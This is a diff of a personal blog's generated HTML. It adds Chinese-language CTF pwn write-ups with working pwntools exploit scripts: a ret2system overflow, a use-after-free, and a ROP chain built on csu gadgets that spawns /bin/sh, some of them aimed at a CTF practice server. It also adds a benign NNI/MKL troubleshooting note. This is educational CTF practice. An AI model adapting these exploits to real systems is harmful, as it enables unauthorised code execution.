+            <span id="/2021/01/14/Writeup-for-First-Week/" class="post-meta-item leancloud_visitors" data-flag-title="Writeup for First Week" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -654,8 +761,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2021/01/14/Jan-14-Writeup/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/14/Jan-14-Writeup/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/01/14/Writeup-for-First-Week/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/14/Writeup-for-First-Week/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -674,7 +781,17 @@
 <p>system函数已经在Print函数中给出来了。只要有一个<code>/bin/sh</code>就够了。</p>
 <p>但是这样也不准确，只需要<code>sh</code>就可以了。</p>
 <p>以后找字符串的时候，直接用ROPgadget，不只能找gadget好吧。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ciscn_2019_ne_5 ROPgadget --binary pwn --string &#39;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080482ea : sh</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27077</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(system_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x080482ea</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input admin password:&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-
+<h2 id="HITCON-training-hacknote"><a href="#HITCON-training-hacknote" class="headerlink" title="HITCON-training hacknote"></a>HITCON-training hacknote</h2><p>UAF第一道题。</p>
+<p>UAF即free掉之后却没有置0，这个残留指针可以再被利用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(magic_addr))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>这道题挺好玩的，要好好记录一下。</p>
+<p>IDA翻译成C出来根本没法读，只能看汇编（汇编更容易看</p>
+<p>主程序在<code>vuln</code>函数里，先从<code>%rsp - 0x10</code>的地址开始读入至多0x400个字符，然后输出0x30个字符，显然栈溢出。</p>
+<p>然后还有个<code>gadget</code>函数，很清楚地能看出<code>mov $0xf, %rax</code>和<code>mov $0x3b, %rax</code>这两个gadget，第一个是sigreturn的调用号，第二个就是execve的调用号。</p>
+<p>然后针对这两个gadgets，分别有SROP和利用通用gadget做ROP这两种方法。</p>
+<p>SROP在网上看到的似乎打不通，就只用普通ROP的做法。</p>
+<p>由于需要控制rdx，需要辛苦点用上通用gadget。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;28690&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">csu_end = <span class="number">0x40059a</span></span><br><span class="line">csu_front = <span class="number">0x400580</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">mov_rax_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">buf = p.recv()[:<span class="number">8</span>]</span><br><span class="line">leak_addr = u64(buf)</span><br><span class="line">binsh_addr = leak_addr - <span class="number">0x138</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span> + p64(mov_rax_ret)</span><br><span class="line">payload += p64(csu_end) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(binsh_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_front) + p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -1073,100 +1190,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/10/Convolution-Neural-Network-Learning-Notes/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Garen Wang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Garen Wang's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/10/Convolution-Neural-Network-Learning-Notes/" class="post-title-link" itemprop="url">Convolution Neural Network Learning Notes</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-01-10 16:02:21" itemprop="dateCreated datePublished" datetime="2021-01-10T16:02:21+08:00">2021-01-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-11 19:34:57" itemprop="dateModified" datetime="2021-01-11T19:34:57+08:00">2021-01-11</time>
-              </span>
-
-          
-            <span id="/2021/01/10/Convolution-Neural-Network-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="Convolution Neural Network Learning Notes" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/2021/01/10/Convolution-Neural-Network-Learning-Notes/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/10/Convolution-Neural-Network-Learning-Notes/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>when describing a “weights-bias”, we use four dimensions:</p>
-<ol>
-<li>the number of filters(euqal to the number of features to output)</li>
-<li>the number of kernals(equal to the number of input channels; RGB: 3, gray: 1)</li>
-<li>the first dimension of the kernal</li>
-<li>the second dimension of the kernal</li>
-</ol>
-<p>a “weights-bias” consist of multiple filters plus a bias.</p>
-<p>While using PyTorch, you can leave the first dimension -1, which means undecided, so that this number can be calculated with the help of the rest known dimension.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/08/My-Hexo-Blog-Configuration/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1464,10 +1487,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-01-08 19:46:45 / Modified: 21:52:00" itemprop="dateCreated datePublished" datetime="2021-01-08T19:46:45+08:00">2021-01-08</time>
+              <time title="Created: 2021-01-08 19:46:45" itemprop="dateCreated datePublished" datetime="2021-01-08T19:46:45+08:00">2021-01-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-23 21:44:49" itemprop="dateModified" datetime="2021-01-23T21:44:49+08:00">2021-01-23</time>
+              </span>
 
           
             <span id="/2021/01/08/NNI-Student-Program-2020-Task1/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Student Program 2020 Task1" title="Views">
@@ -1562,7 +1591,13 @@
 <img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/7.png">
 
 <p>Intermediate Results</p>
-
+<hr>
+<p>Jan 23rd upd: 楼下的评论说的有道理，把评论搬上来……</p>
+<p>在跑NNI的时候，有时经常遇见任何一个trial跑几秒就失败的情况。</p>
+<p>顺着实验文件夹里面的<code>stderr</code>去看，原来报错是这个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error: mkl-service + Intel(R) MKL: MKL_THREADING_LAYER&#x3D;INTEL is incompatible with libgomp.so.1 library.</span><br><span class="line">    Try to import numpy first or set the threading layer accordingly. Set MKL_SERVICE_FORCE_INTEL to force it.</span><br></pre></td></tr></table></figure>
+<p>解决方法是按它所说的：在终端中设置下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> MKL_SERVICE_FORCE_INTEL=1</span><br></pre></td></tr></table></figure>
       
     </div>
 
